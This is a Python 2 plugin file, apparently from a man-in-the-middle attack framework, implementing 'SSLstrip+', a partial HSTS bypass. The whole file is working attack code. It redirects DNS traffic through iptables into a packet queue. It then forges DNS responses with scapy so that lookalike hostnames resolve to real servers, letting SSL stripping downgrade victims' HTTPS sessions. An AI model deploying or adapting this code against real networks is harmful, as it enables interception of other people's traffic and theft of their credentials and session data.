#!/usr/bin/env python2.7

# Copyright (c) 2014-2016 Marcello Salvati
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License as
# published by the Free Software Foundation; either version 3 of the
# License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful, but
# WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the GNU
# General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 59 Temple Place, Suite 330, Boston, MA 02111-1307
# USA
#

import sys
import dns.resolver
import logging

from plugins.plugin import Plugin
from core.utils import SystemConfig
from core.sslstrip.URLMonitor import URLMonitor
from core.wrappers.nfqueue import Nfqueue

logging.getLogger("scapy.runtime").setLevel(logging.ERROR)  #Gets rid of IPV6 Error when importing scapy
from scapy.all import *

class HSTSbypass(Plugin):
	name     = 'SSLstrip+'
	optname  = 'hsts'
	desc     = 'Enables SSLstrip+ for partial HSTS bypass'
	version  = "0.3"
	has_opts = False
	req_root = True

	def initialize(self, options):
		self.options = options
		self.manualiptables = options.manualiptables

		try:
			config = options.configfile['SSLstrip+']
		except Exception, e:
			sys.exit("[-] Error parsing config for SSLstrip+: " + str(e))

		if not options.manualiptables:
			SystemConfig.iptables.DNS(1)

		self.dns = DNSmirror(1)
		self.dns.hstscfg = config
		self.dns.start()

		print "|  |_ SSLstrip+ by Leonardo Nve running"

		URLMonitor.getInstance().setHstsBypass(config)

	def finish(self):
		self.dns.stop()

		if not self.manualiptables:
			SystemConfig.iptables.Flush()

class DNSmirror(Nfqueue):

	hstscfg = None

	def callback(self, payload):
		try:
			#logging.debug(payload)
			pkt = IP(payload.get_payload())

			if not pkt.haslayer(DNSQR):
				payload.accept()

			if (pkt[DNSQR].qtype is 28 or pkt[DNSQR].qtype is 1):
				for k,v in self.hstscfg.iteritems():
					if v == pkt[DNSQR].qname[:-1]:
						ip = self.resolve_domain(k)
						if ip:
							self.modify_dns(payload, pkt, ip)
							return

				if 'wwww' in pkt[DNSQR].qname:
					ip = self.resolve_domain(pkt[DNSQR].qname[1:-1])
					if ip:
						self.modify_dns(payload, pkt, ip)
						return

				if 'web' in pkt[DNSQR].qname:
					ip = self.resolve_domain(pkt[DNSQR].qname[3:-1])
					if ip:
						self.modify_dns(payload, pkt, ip)
						return

			payload.accept()

		except Exception, e:
			print "Exception occurred in nfqueue callback: " + str(e)

	def modify_dns(self, payload, pkt, ip):
		try:
			mpkt = IP(dst=pkt[IP].src, src=pkt[IP].dst) /\
			UDP(dport=pkt[UDP].sport, sport=pkt[UDP].dport) /\
			DNS(id=pkt[DNS].id, qr=1, aa=1, qd=pkt[DNS].qd)

			mpkt[DNS].an = DNSRR(rrname=pkt[DNS].qd.qname, ttl=1800, rdata=ip[0]); del ip[0] #have to do this first to initialize the an field
			for i in ip:
				mpkt[DNS].an.add_payload(DNSRR(rrname=pkt[DNS].qd.qname, ttl=1800, rdata=i))
			
			logging.info("%s Resolving %s for HSTS bypass (DNS)" % (pkt[IP].src, pkt[DNSQR].qname[:-1]))
			payload.set_payload(str(mpkt))
			payload.accept()

		except Exception, e:
			print "Exception occurred while modifying DNS: " + str(e)

	def resolve_domain(self, domain):
		try:
			logging.debug("Resolving -> %s" % domain)
			answer = dns.resolver.query(domain, 'A')
			real_ips = []
			for rdata in answer:
				real_ips.append(rdata.address)

			if len(real_ips) > 0:
				return real_ips

		except Exception:
			logging.info("Error resolving " + domain)
